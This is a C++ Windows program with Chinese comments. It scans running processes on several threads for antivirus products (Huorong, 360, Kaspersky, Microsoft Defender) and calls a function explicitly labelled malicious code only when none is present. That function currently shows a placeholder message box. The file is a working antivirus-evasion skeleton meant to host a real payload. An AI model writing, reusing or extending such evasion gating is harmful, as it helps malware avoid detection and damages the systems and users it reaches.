#include<Windows.h>
#include<iostream>
#include<tlhelp32.h>
#include<WtsApi32.h>
#include<vector>
#include<thread>
#include<mutex>
#pragma comment(lib,"WtsApi32.Lib")

using namespace std;
#define PartCount 5
bool Find = false;//是否检索到目标进程
mutex WriteFind;//对于Find的写保护
const vector<wstring> TargetProcessName = {
	L"huorong.exe",L"360tray.exe",L"360sd.exe",L"avp.exe",L"MsMpEng.exe",L"HipsDaemon.exe"
};
//遍历这部分进程信息，进行目标进程匹配
void RetrievalTargetProcess(PWTS_PROCESS_INFO  pi, int begin, int end) {
	for (auto i = begin; i < end; i++) {
		for (auto j = TargetProcessName.begin(); j != TargetProcessName.end(); j++) {
			if (Find){
					return;
				}
			if (wcscmp(j->c_str(), pi[i].pProcessName)==0) {
				wcout << "匹配到目标进程：" << pi[i].pProcessName << endl;
				WriteFind.lock();
				Find = true;
				//cout << "已找到" << endl;
				WriteFind.unlock();
				return;
			}
		}
	}
};
//划分进程，多线程运行RetrievalTargetProcess
void DivideProcess(bool &res) {
	res = true;
	DWORD dwCount = 0;
	PWTS_PROCESS_INFO pi = { 0 };
	if (WTSEnumerateProcesses(
		NULL,			// 会话主机服务器句柄，NULL：本地主机
		0,				// 保留（必须是 0）
		1,				// 保留（必须是 1）
		&pi,			// 接收 WTS_PROCESS_INFO 对象的指针
		&dwCount		// 接收 WTS_PROCESS_INFO 对象的数量
	)) {
		vector<thread>th(PartCount);
		int length = dwCount / PartCount;
		for (int i = 0; i < PartCount; i++) {
			int temp = i * length;
			if (i == PartCount - 1)th.push_back(thread(RetrievalTargetProcess, pi, temp, dwCount));
			else th.push_back(thread(RetrievalTargetProcess, pi, temp, temp+length));
		} 
		for (auto i = th.begin(); i != th.end(); i++)
			if(i->joinable())i->join();//join之前要判断能否join
		//while (true) {
		//	//这个里会出现一种情况，即有的子线程还未结束，但是已经找到目标进程，当前线程会退出，则程序会崩溃。
		//	if (FinshCount == PartCount||Find)return;
		//}
	}
	else {
		res = false;
		return;
	};
}
//恶意代码
void malware() {
	//cout << "执行恶意代码！" << endl;
	MessageBox(NULL, (LPCTSTR)TEXT("执行恶意代码"), (LPCTSTR)TEXT("执行恶意代码"), MB_OK);
}
int main()
{
	bool GetProcessInfo;
	while (true) {
		thread th(DivideProcess,ref(GetProcessInfo));
		th.join();
		if (!GetProcessInfo) {
			cout << "获取进程信息失败，继续获取！" << endl;
		}
		if (!Find) {
			cout << "没有发现目标进程，跳转执行恶意代码！" << endl;
			break;
		}
	}
	malware();
	return 0;
}


